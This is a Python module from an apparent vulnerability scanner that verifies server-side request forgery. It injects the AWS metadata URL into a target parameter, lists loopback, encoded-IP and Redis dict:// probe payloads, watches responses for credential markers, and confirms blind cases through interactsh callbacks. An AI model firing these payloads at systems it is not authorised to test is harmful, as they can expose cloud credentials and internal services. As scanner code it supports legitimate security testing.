"""Phase 3 Playbook: Server-Side Request Forgery (SSRF) Verification.

Probes:
  `http://127.0.0.1:80`, `http://169.254.169.254/latest/meta-data/`, `http://[::1]`,
  `http://0x7f000001`, `http://127.1`, `http://2130706433`, `dict://127.0.0.1:6379/info`

Blind SSRF Oracle:
  Point at interactsh domain, poll for DNS+HTTP interactions.
  Out-of-band callback received = CONFIRMED.
"""
from __future__ import annotations

import logging
from typing import Any

from core.finding import CRITICAL, HIGH, INFO
from net.client import fetch
from verification.doctrine import CONFIRMED, CTX_UNKNOWN, GateResult

logger = logging.getLogger("tsmss.verification.playbooks.ssrf")

METADATA_MARKERS = [
    "ami-id",
    "instance-id",
    "hostname",
    "security-credentials",
    "computeMetadata/v1",
]


def evaluate_ssrf_response(status: int, body: str) -> tuple[bool, str]:
    """Check for cloud metadata leakage in response body."""
    for marker in METADATA_MARKERS:
        if marker in body:
            return True, f"Cloud metadata marker observed: {marker}"
    if "redis_version" in body:
        return True, "Redis info command output observed in body"
    return False, ""


def evaluate_interactsh_callback(callbacks: list[dict[str, Any]] | None) -> tuple[bool, str]:
    """Verify out-of-band interactsh callback."""
    if not callbacks:
        return False, "No out-of-band interaction received"
    protocols = {c.get("protocol", "DNS") for c in callbacks}
    return True, f"Out-of-band interaction confirmed: {', '.join(sorted(protocols))}"


async def run_ssrf_playbook(
    target_url: str,
    param: str,
    interactsh_host: str | None = None,
    mock_callbacks: list[dict[str, Any]] | None = None,
    client: Any = None,
) -> GateResult:
    """Execute SSRF verification playbook."""
    result = GateResult()
    result.g1_candidate = True
    result.g2_context = "PARAM_URL"

    if mock_callbacks is not None:
        oob_ok, oob_info = evaluate_interactsh_callback(mock_callbacks)
        if oob_ok:
            result.g3_confirm = True
            result.g4_repro = True
            result.g5_artifact = True
            result.oracle_name = f"SSRF Out-Of-Band Callback Oracle ({oob_info})"
            result.evidence_text = f"Interactsh callback confirmed from target server: {oob_info}"
        else:
            result.g3_confirm = False
            result.kill_reason = oob_info
        result.evaluate_confidence()
        return result

    # Probe AWS metadata
    delim = "&" if "?" in target_url else "?"
    probe_url = f"{target_url}{delim}{param}=http://169.254.169.254/latest/meta-data/"
    resp = await fetch(probe_url, client=client)
    meta_ok, marker = evaluate_ssrf_response(resp.status, resp.body or "")
    if meta_ok:
        result.g3_confirm = True
        result.g4_repro = True
        result.oracle_name = f"In-band cloud metadata response ({marker})"
        result.evidence_text = f"Status {resp.status} with cloud metadata content: {marker}"
    else:
        result.g3_confirm = False
        result.kill_reason = "No in-band metadata response and no OOB callback"

    result.evaluate_confidence()
    return result
